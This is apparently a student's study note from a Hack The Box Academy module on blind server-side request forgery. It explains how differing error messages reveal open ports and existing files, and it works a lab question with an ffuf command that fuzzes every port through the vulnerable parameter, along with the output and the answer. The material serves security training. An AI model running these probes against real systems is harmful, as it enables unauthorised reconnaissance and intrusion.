---
sticker: lucide//server
---
In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are calledÂ `blind`Â SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.

---

## Identifying Blind SSRF

The sample web application behaves just like in the previous section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up aÂ `netcat`Â listener:

```shell-session
smoothment@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

However, if we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request; instead, it simply lets us know that the date is unavailable. Therefore, this is a blind SSRF vulnerability:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_1.png)

---

## Exploiting Blind SSRF

Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities.Â However, depending on the web application's behavior, weÂ mightÂ stillÂ be able toÂ conduct a (restricted) localÂ port scanÂ of the system,Â provided the responseÂ differs for open and closed ports.Â In this case, the web application responds withÂ `Something went wrong!`Â for closed ports:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_2.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_3.png)

Depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. For instance, we are unable to identify the running MySQL service using this technique:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_4.png)

Furthermore, while we cannot read local files like before, we can use the same technique to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_5.png)

For invalid files, the error message is different:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_6.png)


# Question
---

![Pasted image 20250212123042.png](../../../../IMAGES/Pasted%20image%2020250212123042.png)

We know we are dealing with blind SSRF, when we try to point at an invalid resource of the server, we can see this:


![Pasted image 20250212123247.png](../../../../IMAGES/Pasted%20image%2020250212123247.png)

We get an error message saying `Something went wrong!`, what about if we point at a valid resource:

![Pasted image 20250212123337.png](../../../../IMAGES/Pasted%20image%2020250212123337.png)

We get a different error message, since we need to enumerate ports, we can use ffuf in the following way:

```
ffuf -w ports.txt:FUZZ -u http://10.129.70.117/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -fr 'Something went wrong!'
```

In order to create our `ports.txt` wordlist, we can use the following command:

```
seq 1 65535 > ports.txt
```

Once we've fuzzed, we get the following:

```
ffuf -w ports.txt:FUZZ -u http://10.129.70.117/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -fr 'Something went wrong!' -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.70.117/index.php
 :: Wordlist         : FUZZ: /home/samsepiol/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dateserver=http://127.0.0.1:FUZZ&date=2024-01-01
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Something went wrong!
________________________________________________

5000                    [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 111ms]
80                      [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 3977ms]
```


Answer is `5000`
